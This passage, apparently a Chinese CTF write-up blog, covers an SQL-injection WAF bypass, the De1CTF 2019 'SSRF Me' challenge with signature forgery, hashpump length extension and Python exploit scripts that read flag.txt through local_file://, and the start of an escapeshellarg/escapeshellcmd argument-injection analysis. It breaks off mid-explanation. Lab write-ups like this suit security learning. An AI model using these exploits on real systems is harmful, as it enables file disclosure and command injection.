<p>直接用 <code>union select</code> 会被WAF检测到，所以使用 <code>/**/</code> 来绕过，反序列化字符串对应数据库data列放在第四列（fuzz测试，爆列名），注入后blog栏显示 <code>file:///var/www/html/flag.php</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj12qj30si072q2x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g97pioj12qj30si072q2x.jpg" class="lazyload"></a></p>
<p>查看源代码，得到一段base64加密的src，进入得到flag</p>
<hr>
<h3 id="一些小hits"><a href="#一些小hits" class="headerlink" title="一些小hits"></a>一些小hits</h3><ul>
<li><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</p>
</li>
<li><p>PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</p>
</li>
<li><p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。<br>PHP中使用cURL实现Get和Post请求的方法<br>这些函数在PHP 4.0.2中被引入。</p>
</li>
</ul>
<hr>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><ul>
<li>直接查看页面源代码可以看到正确格式的代码<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></div></li>
<li>提示给的是 flag 在 .&#x2F;flag.txt</li>
</ul>
<hr>
<h3 id="解法1-字符串拼接"><a href="#解法1-字符串拼接" class="headerlink" title="解法1 字符串拼接"></a>解法1 字符串拼接</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tubxpkj30t80h678h.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tubxpkj30t80h678h.jpg" class="lazyload"></a></p>
<table>
<thead>
<tr>
<th>geneSign()</th>
<th>获得param参数，通过action和param生成签名</th>
</tr>
</thead>
<tbody><tr>
<td>challenge()</td>
<td>获得cookies中的action和sign,再去通过url传参获取param,并且使用Task对象，通过json返回Exec()方法</td>
</tr>
<tr>
<td>index</td>
<td>得到源码</td>
</tr>
</tbody></table>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub93aj30p60legou.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub93aj30p60legou.jpg" class="lazyload"></a></p>
<p>在执行 <strong>Exec</strong> 方法的时候，调用<br>将传入的 <code>action</code> 和 <code>param</code> 参数和传入的 <code>sign</code> 参数进行比较。若相等则执行后面的操作。<br>所以只要我们后面传入的 <code>param</code>和路由 <code>/De1ta</code>下传入的 <code>param</code> 一样，然后 <code>action</code> 也等于 <code>scan</code>。并且将 <code>/geneSign</code> 路由下返回的 <code>sign</code> 一样，就可以了。</p>
<p><code>scan</code>就是访问 <code>param</code> 的网址，并将其内容的前50个字母返回回来。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu743nj30hk056q3b.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu743nj30hk056q3b.jpg" class="lazyload"></a></p>
<p>于是在&#x2F;geneSign路由下将param传参如下:<br>返回了我们自己构建的sign。<br><code>geneSign?param=flag.txt</code> 返回的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;)</code> ，在 python 里面上述表达式就相当于 <code>md5(xxxflag.txtscan)</code> ，这就很有意思了。</p>
<p>直接构造访问 <code>/geneSign?param=flag.txtread</code> ，拿到的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;)</code> ，等价于 <code>md5(&#39;xxxflag.txtreadscan&#39;)</code> ，这就达到了目标。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub2utj310q0b20uy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub2utj310q0b20uy.jpg" class="lazyload"></a></p>
<p>直接访问 <code>/De1ta?param=flag.txt</code> 构造 <code>cookie action=readscan;sign=714adcaac3f1bc1b4e8db9d68d7a0b3d </code>即可<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tuc0qqj316w0b3tbf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tuc0qqj316w0b3tbf.jpg" class="lazyload"></a></p>
<hr>
<h3 id="解法2-哈希拓展攻击"><a href="#解法2-哈希拓展攻击" class="headerlink" title="解法2 哈希拓展攻击"></a>解法2 哈希拓展攻击</h3><ul>
<li><p><code>secert_key</code> 是一个长度为 16 的字符串，在 <code>/geneSign?param=flag.txt</code> 中可以获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code> 的值，为 <code>d97019c7fd4afa870d4f49554b0280f4</code>，而目标则是获取 <code>md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;)</code> 的值</p>
</li>
<li><p>使用 hashpump 即可</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/HashPump<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: d97019c7fd4afa870d4f49554b0280f4</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: <span class="built_in">read</span> </span><br><span class="line">ddecda548cb91c4480e23bcd5763ec3a</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>exp : </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://5f030a29-2344-4f54-b28d-43673b618ef4.node3.buuoj.cn/De1ta?param=flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">  <span class="string">&#x27;sign&#x27;</span>: <span class="string">&#x27;ddecda548cb91c4480e23bcd5763ec3a&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu7sc0j30ia02xmxk.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu7sc0j30ia02xmxk.jpg" class="lazyload"></a></p>
<hr>
<h3 id="大佬的EXP"><a href="#大佬的EXP" class="headerlink" title="大佬的EXP"></a>大佬的EXP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">conn = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5f030a29-2344-4f54-b28d-43673b618ef4.node3.buuoj.cn&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>(<span class="params">param</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url+<span class="string">&quot;/geneSign&quot;</span>,params=data).text</span><br><span class="line">    <span class="built_in">print</span> resp</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">action,param,sign</span>):</span><br><span class="line">    cookie=&#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>:action,</span><br><span class="line">        <span class="string">&quot;sign&quot;</span>:sign</span><br><span class="line">    &#125;</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&quot;param&quot;</span>:param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url+<span class="string">&quot;/De1ta&quot;</span>,params=params,cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line">filename = <span class="string">&quot;local_file:///app/flag.txt&quot;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    sign = geneSign(<span class="string">&quot;&#123;&#125;read&quot;</span>.<span class="built_in">format</span>(filename.<span class="built_in">format</span>(i)))</span><br><span class="line">    resp = challenge(<span class="string">&quot;readscan&quot;</span>,filename.<span class="built_in">format</span>(i),sign)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;title&quot;</span> <span class="keyword">in</span> resp):</span><br><span class="line">        a.append(i)</span><br><span class="line">    <span class="built_in">print</span> resp,i</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>请求 <code>/geneSign?param=local_file:///app/flag.txtread</code> 获取 md5 值为 60ff07b83381a35d13caaf2daf583c94 ，即 <code>md5(secert_key + &#39;local_file:///app/flag.txtread&#39; + &#39;scan&#39;)</code></p>
</li>
<li><p>然后再请求 <code>/De1ta?param=local_file:///app/flag.txt</code> 构造 <code>Cookie: action=readscan;sign=60ff07b83381a35d13caaf2daf583c94</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay6</title>
    <url>/yakko117/2019/12/16/BuuctfDay6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>OK，进行代码审计<br><code>remote_addr</code>和 <code>x_forwarded_for</code> 用于服务器获取ip<br><code>escapeshellarg()</code> 和 <code>escapeshellcmd()</code> 查了些文档</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&#x27; -v -d a=1</span><br><span class="line">经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。</span><br></pre></td></tr></table></figure></div>

<p>没怎么明白，没事，通过一些测试了解一下</p>
<hr>
<h2 id="escapeshellarg-测试"><a href="#escapeshellarg-测试" class="headerlink" title="escapeshellarg 测试"></a>escapeshellarg 测试</h2><ul>
<li><p><code>escapeshellarg</code> — 把字符串转码为可以在 shell 命令里使用的参数</p>
</li>
<li><p>功能 ：<code>escapeshellarg()</code> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 <code>exec()、 system()</code> 执行运算符(反引号)</p>
</li>
<li><p>定义 ：<code>string escapeshellarg ( string $arg )</code></p>
</li>
</ul>
<p>给出如下代码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">escapeshellarg</span>(<span class="string">&quot;123&quot;</span>));  <span class="comment">// &#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">escapeshellarg</span>(<span class="string">&quot;12&#x27;  34&quot;</span>)); <span class="comment">// &#x27;12&#x27;\&#x27;&#x27; 34&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbn9q4wj3094031745.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbn9q4wj3094031745.jpg" class="lazyload"></a></p>
<p>经过 <code>escapeshellarg</code> 函数处理过的参数被拼凑成 shell 命令，并且被双引号包裹这样就会造成漏洞，这主要在于bash中双引号和单引号解析变量是有区别的。</p>
<p>在解析单引号的时候， <strong>被单引号包裹的内容中如果有变量，这个变量名是不会被解析成值的</strong>，但是双引号不同， <code>bash</code> 会将变量名解析成变量的值再使用。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnd3ulj30l309hjs0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnd3ulj30l309hjs0.jpg" class="lazyload"></a></p>
<p>可知， 即使参数用了 <code>escapeshellarg</code> 函数过滤单引号，但参数在拼接命令的时候<strong>用了双引号的话还是会导致命令执行的漏洞</strong>。</p>
<p>紧接着看看 <code>escapeshellcmd</code> 函数的作用吧。</p>
<hr>
<h2 id="escapeshellcmd-测试"><a href="#escapeshellcmd-测试" class="headerlink" title="escapeshellcmd 测试"></a>escapeshellcmd 测试</h2><ul>
<li><p><code>escapeshellcmd</code> — shell 元字符转义</p>
</li>
<li><p>功能：<code>escapeshellcmd()</code> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
</li>
<li><p>反斜线（\）会在以下字符之前插入： **&amp; # ; ` | \ ? ~ &lt;&gt; ^ () [] {} $ *, \x0A 和 \xFF**。 <code>‘</code> 和 <code>“</code> 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替。</p>
</li>
<li><p>定义 ：<code>string escapeshellcmd (string $command)</code></p>
</li>
</ul>
<h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc0kpj30io07faad.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc0kpj30io07faad.jpg" class="lazyload"></a></p>
<p> <code>escapeshellcmd</code> 和 <code>escapeshellarg</code>，这两个函数都会对单引号进行处理，但还是有区别的，区别如下:</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc3r8j30kr0b53z7.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbnc3r8j30kr0b53z7.jpg" class="lazyload"></a></p>
<p>对于单个单引号， <code>escapeshellarg</code> 函数转义后,还会在左右各加一个单引号，但 <code>escapeshellcmd</code> 函数是直接加一个转义符，对于成对的单引号， <code>escapeshellcmd</code> 函数默认不转义，但 <code>escapeshellarg</code> 函数转义:   </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbngayxj30te09umy6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gawdbngayxj30te09umy6.jpg" class="lazyload"></a></p>
<hr>
<h3 id="详细分析一下这个过程："><a href="#详细分析一下这个过程：" class="headerlink" title="详细分析一下这个过程："></a>详细分析一下这个过程：</h3><ol>
<li><p>传入的参数是</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; -v -d a=1</span></span><br></pre></td></tr></table></figure></div>
